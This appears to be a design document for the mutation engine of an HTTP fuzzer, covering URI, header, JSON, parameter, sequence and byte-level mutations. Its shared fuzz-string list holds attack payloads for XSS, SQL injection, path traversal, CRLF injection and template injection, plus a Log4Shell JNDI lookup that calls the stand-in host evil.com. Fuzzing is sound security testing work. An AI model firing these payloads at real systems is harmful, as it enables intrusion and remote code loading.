# Mutation Engine

## Responsibility

Applies mutation strategies to HTTP exchanges to generate fuzzing test cases. Includes URI mutations (path segments, query params, encoding), header mutations, JSON body mutations, parameter injection, byte-level primitives, and sequence-level mutations. Mutations are applied probabilistically based on configured intensity.

## Key Types

```go
type MutationResult struct {
    Exchange  model.Exchange
    Operators []string  // names of applied mutation operators
    Seed      int64     // RNG seed used
}

type ExchangeMutator interface {
    Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult
}

type Config struct {
    PathQuery      bool
    Headers        bool
    JSONBody       bool
    Params         bool
    Sequence       bool
    Intensity      float64
    MaxURLLen      int
    MaxHdrLen      int
    MaxBodyLen     int
    UserDictionary map[string][]string
}

type Pipeline struct {
    cfg       Config
    primitive *PrimitiveMutator
    uri       *URIMutator
    header    *HeaderMutator
    jsonM     *JSONMutator
    param     *ParamMutator
}
```

## Mutation Classes

### URI Mutator (`URIMutator`)
Mutates the request URL path and query string:
- **Path segment removal**: drops one or more path segments
- **Path segment duplication**: duplicates a path segment
- **Path segment replacement**: replaces a segment with fuzz strings
- **Query parameter injection**: adds, removes, or modifies query parameters
- **Reserved characters**: injects `/#?%&` into paths and queries
- **Encoding mutations**: double-encoding, case variations of percent-encoded chars
- **Slash manipulation**: trailing slashes, double slashes, `./` segments

### Header Mutator (`HeaderMutator`)
Mutates HTTP request headers:
- **Add headers**: injects common attack headers (X-Forwarded-For, Content-Type overrides, etc.)
- **Remove headers**: drops authentication or content headers
- **Duplicate headers**: sends the same header multiple times
- **Long header values**: injects very long strings (up to MaxHdrLen)
- **Conflicting headers**: sends headers with contradictory values
- **User dictionary**: replaces header values with items from UserDictionary

### JSON Body Mutator (`JSONMutator`)
Mutates JSON request bodies (only when Content-Type is JSON):
- **Type substitution**: replaces string ↔ number ↔ boolean ↔ null ↔ array ↔ object
- **Object key manipulation**: adds, removes, renames keys
- **Array mutations**: removes elements, duplicates elements, changes element types
- **Boundary values**: sets numbers to 0, -1, MaxInt, MinInt, NaN-ish values
- **Deep nesting**: adds deeply nested objects
- **String injection**: replaces string values with fuzz strings (XSS, SQLi, path traversal, null bytes, etc.)

### Param Mutator (`ParamMutator`)
Injects additional HTTP parameters:
- Query string parameters with fuzz payloads
- URL-encoded form body parameters
- Multipart parameter injection
- Duplicate parameter injection

### Sequence Mutator (`SeqMutator`)
Mutates the ordering of exchanges within a session:
- **Drop exchanges**: removes one or more exchanges from the sequence
- **Duplicate exchanges**: repeats an exchange multiple times
- **Swap exchanges**: reverses the order of two exchanges
- **Reorder**: randomly shuffles sequences (when multiple exchanges exist)

### Primitive Mutator (`PrimitiveMutator`)
Low-level byte manipulations applied to request bodies:
- **BitFlip**: flips random bits in the body
- **ByteFlip**: flips random bytes
- **Arithmetic**: adds/subtracts small values from bytes
- **InterestingReplace**: replaces bytes with "interesting" values (0x00, 0xFF, boundary values)
- **BlockInsert**: inserts blocks of bytes
- **BlockDelete**: deletes blocks of bytes
- **BlockDuplicate**: duplicates blocks of bytes
- **Splice**: combines two body segments

## Pipeline Execution

```go
func (p *Pipeline) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
    // Each class is applied independently with probability = intensity
    if p.cfg.PathQuery && rng.Float64() < intensity { /* URI mutations */ }
    if p.cfg.Headers   && rng.Float64() < intensity { /* header mutations */ }
    if p.cfg.JSONBody  && rng.Float64() < intensity { /* JSON body mutations */ }
    if p.cfg.Params    && rng.Float64() < intensity { /* param injection */ }

    // Fallback: if nothing was applied, apply primitive mutation
    if len(ops) == 0 {
        // primitive mutation
    }

    // Post-mutation size enforcement
    result = p.enforceSizeLimits(result)
    return MutationResult{Exchange: result, Operators: ops}
}
```

Each mutation class applies independently based on the configured intensity. An exchange may receive zero, one, or multiple mutation classes in a single pass.

## Fuzz Strings

A global `fuzzStrings` slice is shared by multiple mutators (JSON body string injection and param injection):

```go
var fuzzStrings = []string{
    "",
    strings.Repeat("A", 1024),
    strings.Repeat("A", 65536),
    "\x00\x01\x02\x03",
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "../../../etc/passwd",
    "\r\nX-Injected: true",
    "\u0000",
    "\uFFFD",
    strings.Repeat("\u202E", 100),
}
```

## Size Enforcement

After mutation, the exchange is checked against configured maximums:
- **URL** (path + query): truncated to `MaxURLLen` (default 8192)
- **Header values**: truncated to `MaxHdrLen` (default 8192)
- **Body**: truncated to `MaxBodyLen` (default 1MB), marks `BodyTruncated = true`

## Invariants

- Each mutation pass uses a deterministic RNG seeded from the task's `MutationSeed`. This ensures reproducibility — the same seed produces the same mutations.
- At least one mutation is always applied (`primitive.Mutate` fallback). The pipeline never returns an unmodified exchange with zero operators.
- When `Intensity = 0`, only the primitive mutator is applied (as fallback, since all class-level mutations are skipped).
- JSON body mutations are only applied when the Content-Type header contains "json". Non-JSON bodies are ignored by the JSON mutator.
- Size enforcement runs after all mutations and may produce truncated output. Truncation is tracked in the `MutationResult.Exchange.Request.BodyTruncated` field.
- Mutation operators are recorded in `MutationResult.Operators` for debugging and reproducibility.

## Dependencies

| Package | Used for |
|---------|----------|
| `internal/model` | `Exchange`, `RequestData` |

## Edge Cases

- **Empty body**: Primitive mutator operates on empty byte slice; may produce non-empty body.
- **Non-JSON body with JSONBody enabled**: JSON mutator skips — checks Content-Type before attempting JSON operations.
- **Single exchange in session with Sequence enabled**: Sequence mutations are no-ops (no reordering possible).
- **Zero intensity**: Only primitive mutations are applied. All other classes are skipped.
- **Extreme size mutations**: Size enforcement guarantees URL ≤ MaxURLLen, headers ≤ MaxHdrLen, body ≤ MaxBodyLen regardless of mutation output.
